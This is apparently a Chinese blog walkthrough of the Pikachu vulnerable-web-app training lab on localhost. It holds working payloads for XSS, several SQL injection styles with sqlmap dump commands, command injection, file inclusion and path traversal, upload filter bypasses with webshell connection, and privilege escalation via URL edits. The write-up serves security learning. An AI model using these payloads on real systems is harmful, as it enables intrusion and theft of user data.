+<h3 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=alert(&#x27;hello&#x27;)&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>输入信息同时也会显示在url输入框里。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.vika.cn/space/2023/08/12/3c48c1b0488e43e39851e5b69b5301f9"
+                      alt="dom型xss-x1"
+                ></p>
+<h3 id="xss之盲打"><a href="#xss之盲打" class="headerlink" title="xss之盲打"></a>xss之盲打</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">留言板输入：</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.vika.cn/space/2023/08/12/d152522ab50d4633aa4104e1caa5f4fe"
+                      alt="xss之盲打1"
+                ></p>
+<p>提示&#x2F;xssblind&#x2F;admin_login.php，登陆后台发现脚本会立即执行</p>
+<h3 id="xss之过滤"><a href="#xss之过滤" class="headerlink" title="xss之过滤"></a>xss之过滤</h3><p>大小写绕过</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ScRipt&gt;alert(1)&lt;/ScriPt&gt;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="xss之htmlspecialchars"><a href="#xss之htmlspecialchars" class="headerlink" title="xss之htmlspecialchars"></a>xss之htmlspecialchars</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=&#x27;alert(1)&#x27;</span><br><span class="line"></span><br><span class="line">&#x27; onclick=&#x27;javascript:alert(document.cookie)&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="xss之href输出"><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a>xss之href输出</h3><p>js伪协议绕过</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="xss之js输出"><a href="#xss之js输出" class="headerlink" title="xss之js输出"></a>xss之js输出</h3><p>输入信息通过审查元素可以看到输入内容在js标签内</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.vika.cn/space/2023/08/12/752caaecac864c0b9a9a89f9bae62685"
+                      alt="xss之js输出1"
+                ></p>
+<p>可以先把前面的&lt;script&gt;进行闭合，构造以下payload即可</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="0x04-CSRF"><a href="#0x04-CSRF" class="headerlink" title="0x04 CSRF"></a>0x04 CSRF</h2><h3 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h3><h3 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h3><h3 id="CSRF-token"><a href="#CSRF-token" class="headerlink" title="CSRF(token)"></a>CSRF(token)</h3><h2 id="0x05-Sql-Inject"><a href="#0x05-Sql-Inject" class="headerlink" title="0x05 Sql Inject"></a>0x05 Sql Inject</h2><h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><p><strong>1，手动注入</strong></p>
+<p>发现是个选项，无法输入东西 ，直接拦截数据包，在burp里进行修改</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.vika.cn/space/2023/08/12/61878eb5117346278df8e6d21d484797"
+                      alt="数字型注入1"
+                ></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">id=1</span><br><span class="line">#正常回显</span><br><span class="line"></span><br><span class="line">id=1&#x27;</span><br><span class="line">#提示报错</span><br><span class="line"></span><br><span class="line">id=1 and 1=1</span><br><span class="line">#正常回显</span><br><span class="line"></span><br><span class="line">id=1 and 1=2</span><br><span class="line">#报错，基本判断为mysql数据库的数字型注入点</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">id=1 or 1=1</span><br><span class="line">#直接爆破出全部数据</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>2，无脑sqlmap</strong></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u http://127.0.0.1/vul/sqli/sqli_id.php --data &quot;id=1&quot; --batch -D pikachu -T member --dump</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.vika.cn/space/2023/08/12/7a4fcbf829824989ab92496fc3c086ca"
+                      alt="数字型注入2"
+                ></p>
+<h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">123</span><br><span class="line">#正常</span><br><span class="line"></span><br><span class="line">123&#x27;</span><br><span class="line">#发现报错</span><br><span class="line"></span><br><span class="line">123&#x27;&#x27;</span><br><span class="line">#又是正常了，基本上判定为字符型注入</span><br><span class="line"></span><br><span class="line">123&#x27; or 1=1 #</span><br><span class="line">#爆出所有用户</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//附</span><br><span class="line"></span><br><span class="line">123&#x27; union select database(),2 #</span><br><span class="line">#查询数据库名称</span><br><span class="line"></span><br><span class="line">123&#x27; union select table_schema,table_name from information_schema.tables where table_schema=&quot;pikachu&quot; #</span><br><span class="line">#查询表，发现有个users项</span><br><span class="line"></span><br><span class="line">123&#x27; union select table_name,column_name from information_schema.columns where table_name=&quot;users&quot; #</span><br><span class="line">#查询uesrs表中的内容，发现存在username和password项</span><br><span class="line"></span><br><span class="line">123&#x27; union select username,password from users #</span><br><span class="line">#查出信息，但是密码是经过md5加密的，解密一下就行</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>sqlmap</strong></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://127.0.0.1/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot; -D pikachu -T member --batch --dump</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h3><p>由于没有过滤“%”，“%”可以进行匹配任意字符，与linux中的”*“类似</p>
+<p><strong>sqlmap</strong></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://127.0.0.1/vul/sqli/sqli_search.php?name=1&amp;submit=%E6%90%9C%E7%B4%A2&quot; --batch -D pikachu -T member --dump</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h3><p>用123‘测试发现报错中含有一个反括号，</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.vika.cn/space/2023/08/12/0b40919a80ae498d9815e4457a5965b4"
+                      alt="xx型注入1"
+                ></p>
+<p>那就构造以下payload：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123&#x27;) or 1=1 #</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>sqlmap</strong></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/vul/sqli/sqli_x.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot; --batch -D pikachu -T member --dump</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="“insert-update”注入"><a href="#“insert-update”注入" class="headerlink" title="“insert&#x2F;update”注入"></a>“insert&#x2F;update”注入</h3><p>注册一下账户，然后brup抓包，随便选一个变量，修改如下</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.vika.cn/space/2023/08/12/fe555fea57e745c9b9428ea38bb4a2dd"
+                      alt="报错注入1"
+                ></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select database()))) and &#x27;1&#x27;=&#x27;1</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 报错注入两个典型的函数</span><br><span class="line">extractvalue()		是mysql对xml文档数据进行查询和修改的xpath函数</span><br><span class="line">updatexml()			是mysql对xml文档数据进行查询的xpath函数</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="“delete”注入"><a href="#“delete”注入" class="headerlink" title="“delete”注入"></a>“delete”注入</h3><p>操作同上，在点击删除留言时进行抓包，发现有一个id参数可以进行注入，不过发现注入的参数中不能出现空格，否则空格后面不会进行处理</p>
+<p>可以用“+”代替空格</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+and+updatexml(1,concat(0x7e,database(),0x7e),1)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.vika.cn/space/2023/08/12/0af26ca25cc440cd87e1683bc22e3942"
+                      alt="报错注入2"
+                ></p>
+<h3 id="“http-header”注入"><a href="#“http-header”注入" class="headerlink" title="“http header”注入"></a>“http header”注入</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.vika.cn/space/2023/08/12/4f4d58643a944fefa047f5119908366c"
+                      alt="http_header注入"
+                ></p>
+<p>用提示给的用户登陆以下发现显示以上信息</p>
+<p>直接抓包，然后修改User-Agent或者Accept，</p>
+<p>修改如下：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and extractvalue(1,concat(0x7e,(database()))) and &#x27;1&#x27;=&#x27;1</span><br><span class="line">或</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></div>
+
+<p>经测试，cookie中的uname和pw变量也能进行注入</p>
+<h3 id="盲注（base-on-boolean）"><a href="#盲注（base-on-boolean）" class="headerlink" title="盲注（base on boolean）"></a>盲注（base on boolean）</h3><p>当输入kobe时显示uid和email</p>
+<p>当输入其他的值后显示输入的username不存在</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.vika.cn/space/2023/08/12/41d6aa8e61624862b3dc0e6f830adf3e"
+                      alt="boolean盲注1"
+                ></p>
+<p>经测试是用 <strong>‘</strong> 进行闭合的</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kobe&#x27;</span><br><span class="line"># 未查到username信息</span><br><span class="line"></span><br><span class="line">kobe&#x27;and &#x27;1&#x27;=&#x27;1</span><br><span class="line">#可以查到，判定用&#x27;闭合</span><br><span class="line"></span><br><span class="line">kobe&#x27;and length(database())=n#</span><br><span class="line"># &quot;n&quot;为一个数字，此处为了判定数据库字符的长度，经测试，当n=7时，正常显示，即可判定数据库名字长度为7</span><br></pre></td></tr></table></figure></div>
+
+<p>burp抓包进行爆破数据库名字</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe&#x27; and substr(database(),1,1)=&#x27;a&#x27;#</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.vika.cn/space/2023/08/12/98bc46e26cd34842a309e03383a136ba"
+                      alt="boolean盲注2"
+                ></p>
+<p>第一个参数修改</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.vika.cn/space/2023/08/12/e4c7a656d5df4108aefea632dbd20f7a"
+                      alt="boolean盲注3"
+                ></p>
+<p>第二个参数修改，爆破字符为a-z ，顺带着添加一个”_”</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.vika.cn/space/2023/08/12/77a6c71a8e894d339f3afd1ad959468f"
+                      alt="boolean盲注4"
+                ></p>
+<p><strong>sqlmap</strong></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://127.0.0.1/vul/sqli/sqli_blind_b.php?name=123&amp;submit=%E6%9F%A5%E8%AF%A2&quot; --batch</span><br></pre></td></tr></table></figure></div>
+
+<p>然后稍微排下序即可爆出数据库名字</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.vika.cn/space/2023/08/12/d7935e52aaaf4a2c8b63c0db5a262dfc"
+                      alt="boolean盲注5"
+                ></p>
+<h3 id="盲注（base-on-time）"><a href="#盲注（base-on-time）" class="headerlink" title="盲注（base on time）"></a>盲注（base on time）</h3><p>增加一个sleep(n)函数，加个判断，用回显时间的长短来判断，剩下的操作和上一样</p>
+<p><strong>sqlmap</strong></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://127.0.0.1/vul/sqli/sqli_blind_t.php?name=123&amp;submit=%E6%9F%A5%E8%AF%A2&quot; --batch</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>引用大佬的链接<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/aa2528877987/article/details/118569895" >https://blog.csdn.net/aa2528877987/article/details/118569895 <i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">宽字节注入原理：</span><br><span class="line"></span><br><span class="line">　　GBK 占用两字节</span><br><span class="line"></span><br><span class="line">　　ASCII占用一字节</span><br><span class="line"></span><br><span class="line">　　PHP中编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集。</span><br><span class="line"></span><br><span class="line">　　输入%df和函数执行添加的%5C，被合并成%df%5C。由于GBK是两字节，这个%df%5C被MYSQL识别为GBK。导致本应的%df\变成%df%5C。%df%5C在GBK编码中没有对应，所以被当成无效字符。</span><br><span class="line"></span><br><span class="line">　　%DF’ ：会被PHP当中的addslashes函数转义为“%DF\&#x27;” ，“\”既URL里的“%5C”，那么也就是说，“%DF&#x27;”会被转成“%DF%5C%27”倘若网站的字符集是GBK，MYSQL使用的编码也是GBK的话，就会认为“%DF%5C%27”是一个宽字符。也就是“縗’”</span><br><span class="line"></span><br><span class="line">例如：http://www.xxx.com/login.php?user=%df’ or 1=1 limit 1,1%23&amp;pass=</span><br><span class="line"></span><br><span class="line">其对应的sql就是：</span><br><span class="line"></span><br><span class="line">select * fromcms_user where username = ‘運’ or 1=1 limit 1,1#’ and password=”</span><br></pre></td></tr></table></figure></div>
+
+<p>在’前面加个%df也就可以实现逃逸转义，然后burp抓包，剩下操作同上</p>
+<h2 id="0x06-RCE"><a href="#0x06-RCE" class="headerlink" title="0x06 RCE"></a>0x06 RCE</h2><h3 id="exec”ping”"><a href="#exec”ping”" class="headerlink" title="exec”ping”"></a>exec”ping”</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;&amp;dir</span><br><span class="line">#执行完ping指令后同时执行dir指令</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="exec”eval”"><a href="#exec”eval”" class="headerlink" title="exec”eval”"></a>exec”eval”</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">直接输入 phpinfo();</span><br></pre></td></tr></table></figure></div>
+
+<p>经过查看源码发现代码如下</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.vika.cn/space/2023/08/12/926ff3d7ff244063a72151fdfa320164"
+                      alt="rce1"
+                ></p>
+<p>于是尝试用蚁剑进行连接，最后发现修改如下可以成功连接</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.vika.cn/space/2023/08/12/7c167c375da14a80b7fabd5de25c8c3c"
+                      alt="rce2"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.vika.cn/space/2023/08/12/bfbd21abb81c490c90604445e925dbb5"
+                      alt="rce3"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.vika.cn/space/2023/08/12/b6aa7e06167d42bdad304479a1dee4d2"
+                      alt="rce4"
+                ></p>
+<h2 id="0x07-File-Inclusion"><a href="#0x07-File-Inclusion" class="headerlink" title="0x07 File Inclusion"></a>0x07 File Inclusion</h2><h3 id="file-inclusion-local"><a href="#file-inclusion-local" class="headerlink" title="file inclusion(local)"></a>file inclusion(local)</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">..\..\..\Users\sfd\Desktop\demo.txt</span><br><span class="line">#直接访问电脑桌面的文件</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.vika.cn/space/2023/08/12/6913ded72a084cd498cbccb2d9326e5d"
+                      alt="file_inclusion"
+                ></p>
+<h3 id="file-inclusion-remote"><a href="#file-inclusion-remote" class="headerlink" title="file inclusion(remote)"></a>file inclusion(remote)</h3><p>同标题，还是相同的位置，可以通过输入链接进行访问其他东西</p>
+<h2 id="0x08-Unsafe-file-download"><a href="#0x08-Unsafe-file-download" class="headerlink" title="0x08 Unsafe file download"></a>0x08 Unsafe file download</h2><h3 id="Unsafe-file-download"><a href="#Unsafe-file-download" class="headerlink" title="Unsafe file download"></a>Unsafe file download</h3><p>当鼠标悬浮在要下载的文件上时，发现左下角有详细链接</p>
+<p>那么我们可以修改这个链接指向的filename来进行下载任意文件</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.vika.cn/space/2023/08/12/fbb7680a5a144f76bd1411647a0d5311"
+                      alt="不安全的文件下载1"
+                ></p>
+<p>要下载本地文件用法和[File Inclusion(loacl)](#File Inclusion(local))一样，直接在filename&#x3D;后面添加想要下载文件的相对位置</p>
+<h2 id="0x09-unsafe-upfileupload"><a href="#0x09-unsafe-upfileupload" class="headerlink" title="0x09 [unsafe upfileupload]"></a>0x09 [unsafe upfileupload]</h2><h3 id="client-check"><a href="#client-check" class="headerlink" title="client check"></a>client check</h3><p>先上传一张图片，然后burp抓包，修改后缀后放包即可</p>
+<p>最后用蚁剑连接即可。</p>
+<h3 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h3><p>直接上传php木马，同样抓包，然后修改Content-Type 为 image&#x2F;png 即可</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.vika.cn/space/2023/08/12/0df49d200af8493ba3a38fad75d4756f"
+                      alt="MIME_type1"
+                ></p>
+<h3 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h3><p>添加了对文件进行判断有没有图片特征的函数，直接用cmd命令合成一个图片码即可绕过</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy /b a.png + a.php b.png</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.vika.cn/space/2023/08/12/735f4d62e1bf4d738bab5a37f5b2b516"
+                      alt="getimagesize1"
+                ></p>
+<h2 id="0x10-over-permission"><a href="#0x10-over-permission" class="headerlink" title="0x10 over permission"></a>0x10 over permission</h2><h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><p>首先以lucy的身份进行登录，然后可以看到lucy的信息</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/vul/overpermission/op1/op1_mem.php?username=lucy&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF</span><br></pre></td></tr></table></figure></div>
+
+<p>这时我们直接修改url里的username，将其指定为kobe,就可以直接查看kobe的信息</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/vul/overpermission/op1/op1_mem.php?username=kobe&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><p>pikachu用户只有查看权限，而admin用户有所有权限</p>
+<p>首先登陆admin并添加用户，然后可以获得一个url地址</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/vul/overpermission/op2/op2_admin_edit.php</span><br></pre></td></tr></table></figure></div>
+
+<p>然后我们用pikachu用户登陆，然后直接输入上面的地址，发现可以进入添加用户界面，并且可以正常添加用户，回到admin用户后发现可以看到当前创建的用户</p>
+<h2 id="0x11-目录遍历"><a href="#0x11-目录遍历" class="headerlink" title="0x11 ..&#x2F;..&#x2F;(目录遍历)"></a>0x11 ..&#x2F;..&#x2F;(目录遍历)</h2><h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">../../../../Users/sfd/Desktop/demo.txt</span><br><span class="line">#访问桌面的一个demo.txt 文件</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="0x12-敏感信息泄露"><a href="#0x12-敏感信息泄露" class="headerlink" title="0x12 敏感信息泄露"></a>0x12 敏感信息泄露</h2><h3 id="icanyourABC"><a href="#icanyourABC" class="headerlink" title="icanyourABC"></a>icanyourABC</h3><p>F12进行元素审查时发现一个测试用户可以使用</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.vika.cn/space/2023/08/12/f71e82366b5d4a41bbcc9987ace4a02f"
+                      alt="敏感信息泄露1"
+                ></p>
+<h2 id="0x13-php反序列化"><a href="#0x13-php反序列化" class="headerlink" title="0x13 php反序列化"></a>0x13 php反序列化</h2><h3 id="php反序列化漏洞"><a href="#php反序列化漏洞" class="headerlink" title="php反序列化漏洞"></a>php反序列化漏洞</h3><p>php涉及到序列化的函数有两个，分别是serialize()<code>和</code>unserialize()</p>
+<p>序列化简单来说就是将一个<strong>对象</strong>转化成可以传输的<strong>字符串</strong>，反序列化就是相反的操作</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#举个例子</span><br><span class="line">class S&#123;</span><br><span class="line">        public $test=&quot;pikachu&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $s=new S(); //创建一个对象</span><br><span class="line">    serialize($s); //把这个对象进行序列化</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    序列化后得到的结果是这个样子的 O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;</span><br><span class="line">  	    O:代表object</span><br><span class="line">        1:代表对象名字长度为一个字符</span><br><span class="line">        S:对象的名称</span><br><span class="line">        1:代表对象里面有一个变量</span><br><span class="line">        s:数据类型</span><br><span class="line">        4:变量名称的长度</span><br><span class="line">        test:变量名称</span><br><span class="line">        s:数据类型</span><br><span class="line">        7:变量值的长度</span><br><span class="line">        pikachu:变量值</span><br></pre></td></tr></table></figure></div>
+
+<p>反序列化</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$u=unserialize(&quot;O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;&quot;);</span><br><span class="line">    echo $u-&gt;test; //得到的结果为pikachu</span><br></pre></td></tr></table></figure></div>
+
+<p>序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题</p>
